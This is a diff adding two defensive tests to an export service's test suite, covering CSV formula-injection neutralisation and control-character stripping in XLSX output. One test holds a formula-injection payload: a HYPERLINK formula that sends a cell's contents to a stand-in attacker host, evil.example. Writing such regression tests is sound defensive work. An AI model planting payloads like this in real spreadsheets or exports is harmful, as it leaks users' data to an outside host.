@@ -7,6 +7,7 @@ the export service sees in production, the same discipline test_runs.py
 already follows.
 """
 
+import csv
 import io
 import json
 import zipfile
@@ -18,7 +19,7 @@ from sqlalchemy.orm import Session
 
 from app.adapters.base import AdapterCitation, RawResponsePayload
 from app.models import Client, Prompt, PromptSet
-from app.services.export import EXCEL_CELL_CHAR_LIMIT
+from app.services.export import EXCEL_CELL_CHAR_LIMIT, RUN_COLUMNS
 from tests.fake_adapter import FakeAdapter
 
 EXPORT_MEDIA_TYPES = {
@@ -107,6 +108,47 @@ def test_run_export_xlsx_raw_payload_truncates_at_excel_cell_limit(client: TestC
 
     assert len(cell_value) == EXCEL_CELL_CHAR_LIMIT
     assert cell_value.endswith("[truncated — use format=json for full payload]")
+
+
+def test_run_export_csv_neutralizes_formula_injection(client: TestClient, seed: dict, sample_prompt: Prompt):
+    """A rendered_text starting with '=' must not reach runs.csv as a live formula (CSV/formula injection)."""
+    formula_payload = '=HYPERLINK("http://evil.example/"&A1,"Click me")'
+    run_id = _trigger_run(
+        client,
+        sample_prompt.id,
+        seed,
+        payload=RawResponsePayload(
+            raw_payload={"answer": formula_payload}, rendered_text=formula_payload, has_citations=False, citations=[], token_usage=None
+        ),
+    )
+
+    response = client.get(f"/runs/{run_id}/export", params={"format": "csv"})
+    zf = zipfile.ZipFile(io.BytesIO(response.content))
+    row = next(csv.DictReader(io.StringIO(zf.read("runs.csv").decode())))
+
+    assert row["rendered_text"] == "'" + formula_payload
+    assert not row["rendered_text"].startswith(("=", "+", "-", "@"))
+
+
+def test_run_export_xlsx_strips_control_characters_instead_of_crashing(client: TestClient, seed: dict, sample_prompt: Prompt):
+    """A control character in provider output must not crash build_xlsx with openpyxl's IllegalCharacterError."""
+    dirty_text = "Answer contains a stray control char: \x01 right here."
+    run_id = _trigger_run(
+        client,
+        sample_prompt.id,
+        seed,
+        payload=RawResponsePayload(
+            raw_payload={"answer": dirty_text}, rendered_text=dirty_text, has_citations=False, citations=[], token_usage=None
+        ),
+    )
+
+    response = client.get(f"/runs/{run_id}/export", params={"format": "xlsx", "content": "full"})
+
+    assert response.status_code == 200
+    wb = load_workbook(io.BytesIO(response.content))
+    rendered = wb["Runs"].cell(row=2, column=RUN_COLUMNS.index("rendered_text") + 1).value
+    assert "\x01" not in rendered
+    assert rendered == "Answer contains a stray control char:  right here."
 
 
 # --- Prompt scope --------------------------------------------------------
